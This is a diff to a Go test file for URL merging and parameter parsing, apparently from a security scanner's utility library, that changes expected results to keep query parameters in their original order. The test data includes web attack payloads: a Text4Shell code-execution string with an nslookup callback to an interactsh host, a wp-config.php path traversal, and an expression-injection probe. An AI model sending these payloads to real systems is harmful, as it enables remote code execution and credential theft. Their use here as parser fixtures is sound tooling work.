@@ -73,8 +73,8 @@ func TestMergeWithParams(t *testing.T) {
 		{"http://scanme.sh/?admin=true", "/%20test%0a", "http://scanme.sh/%20test%0a?admin=true"},
 		{"https://scanme.sh?admin=true", "/%20test%0a", "https://scanme.sh/%20test%0a?admin=true"},
 		{"scanme.sh", "/path", "scanme.sh/path"},
-		{"scanme.sh?wp=false", "/path?yes=true&admin=false", "scanme.sh/path?admin=false&wp=false&yes=true"},
-		{"https://scanme.sh", "?user=true&pass=yes", "https://scanme.sh?pass=yes&user=true"},
+		{"scanme.sh?wp=false", "/path?yes=true&admin=false", "scanme.sh/path?wp=false&yes=true&admin=false"},
+		{"https://scanme.sh", "?user=true&pass=yes", "https://scanme.sh?user=true&pass=yes"},
 		{"scanme.sh", "favicon.ico", "scanme.sh/favicon.ico"},
 	}
 	for _, v := range testcase {
@@ -112,7 +112,7 @@ func TestParameterParsing(t *testing.T) {
 	}{
 		{"/text4shell/attack?search=$%7bscript:javascript:java.lang.Runtime.getRuntime().exec('nslookup%20{{Host}}.{{Port}}.getparam.{{interactsh-url}}')%7d", "search=$%7bscript:javascript:java.lang.Runtime.getRuntime().exec('nslookup%20{{Host}}.{{Port}}.getparam.{{interactsh-url}}')%7d"},
 		{"/filedownload.php?ebookdownloadurl=../../../wp-config.php", "ebookdownloadurl=../../../wp-config.php"},
-		{"/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test", "client_id=acme&redirect_uri=http://test&response_type=${13337*73331}&scope=openid"},
+		{"/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test", "response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test"},
 	}
 	for _, v := range testcases {
 		rurl, err := ParseURL(v.URL, false)
